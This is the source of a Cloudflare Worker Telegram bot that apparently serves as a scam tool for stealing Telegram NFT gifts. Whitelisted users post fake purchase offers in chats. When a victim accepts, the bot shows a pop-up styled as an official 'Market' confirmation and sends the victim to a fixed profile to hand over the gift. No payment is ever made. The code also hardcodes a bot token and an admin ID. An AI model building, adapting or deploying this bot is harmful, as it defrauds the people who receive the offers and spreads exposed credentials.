const ADMIN_ID = 5151757168;
const BOT_TOKEN = "9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew";

export default {
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();
      const kv = env.USERS_KV;

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (username && kv) await kv.put(`username:${username.toLowerCase()}`, userId.toString());

        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = "🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>" + userId + "</code>";
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Доступ открыт</b>\n🆔 <b>ID:</b> <code>${userId}</code>\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/PlushPepe-2687 9000 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- /add ---
      if (update.message && update.message.text.startsWith("/add ")) {
        const senderId = update.message.from.id;
        if (senderId === ADMIN_ID && kv) {
          let target = update.message.text.split(" ")[1].trim();
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            if (foundId) {
              await kv.put(`user:${foundId}`, "true");
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Попросите <b>@${uname}</b> нажать /start в боте.`, parse_mode: "HTML" });
            }
          } else {
            await kv.put(`user:${target}`, "true");
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.`, parse_mode: "HTML" });
          }
        }
      }

      // --- /remove ---
      if (update.message && update.message.text.startsWith("/remove ")) {
        const senderId = update.message.from.id;
        if (senderId === ADMIN_ID && kv) {
          let target = update.message.text.split(" ")[1].trim();
          if (target.startsWith("@")) {
            const uname = target.slice(1).toLowerCase();
            const foundId = await kv.get(`username:${uname}`);
            if (foundId) {
              await kv.delete(`user:${foundId}`);
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь <b>@${uname}</b> удалён.`, parse_mode: "HTML" });
            } else {
              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден.`, parse_mode: "HTML" });
            }
          } else {
            await kv.delete(`user:${target}`);
            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `🗑 Пользователь с ID <code>${target}</code> удалён.`, parse_mode: "HTML" });
          }
        }
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const isAdmin = userId === ADMIN_ID;
        let isAllowed = false;
        if (kv) isAllowed = await kv.get(`user:${userId}`);

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        // Умный парсинг: ищем любые цифры (сумма) и любую ссылку/название подарка
        const textQuery = iq.query.trim();
        const numMatch = textQuery.match(/\d+/); // Ищем сумму
        const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); // Ищем подарок

        // Если ввели хоть что-то (даже с ошибками), бот сформирует оффер
        const amount = numMatch ? numMatch[0] : "0";
        const giftId = giftMatch ? giftMatch[0] : "Подарок";

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за подарок <b>${giftId}</b>.\n\n⏳ Предложение действительно 5 ч. 59 мин.`;

        const results = [{
          type: "article",
          id: "1",
          title: `Оффер от ${senderName}`,
          description: `За ${amount} ⭐ Stars`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: {
            inline_keyboard: [
              // В кнопке ВСЕГО 3 БУКВЫ. Это 100% влезает в лимит Telegram.
              [{ text: "✅ Принять", callback_data: "acc" }],
              [{ text: "❌ Отклонить", callback_data: "dec" }]
            ]
          }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;
        
        // Получаем текст сообщения (или подпись под картинкой)
        const messageText = cq.message.text || cq.message.caption || "";
        const hasCaption = !!cq.message.caption;

        // Вытаскиваем сумму из текста сообщения (ищем цифры перед словом Stars)
        const amountMatch = messageText.match(/(\d+)\s*⭐/);
        const amount = amountMatch ? amountMatch[1] : "0";

        if (cq.data === "acc") {
          // 1. Мгновенно убираем загрузку и показываем всплывающее окно (как на фото 2)
          await callApi("answerCallbackQuery", { 
            callback_query_id: cq.id, 
            text: `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐`, 
            show_alert: true 
          });

          // 2. Меняем текст сообщения (как на фото 2)
          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
          // Кнопка просто ведет в твой профиль для передачи (так как мы не передаем юзернейм)
          const newMarkup = { 
            inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] 
          };

          if (hasCaption) {
            await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
          } else {
            await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
          }
        } 
        else if (cq.data === "dec") {
          // 1. Убираем загрузку
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });

          // 2. Меняем текст (как на фото 5)
          const newText = `× Оффер отклонён.`;
          const emptyMarkup = { inline_keyboard: [] };

          if (hasCaption) {
            await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
          } else {
            await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
          }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
  return response.json();
}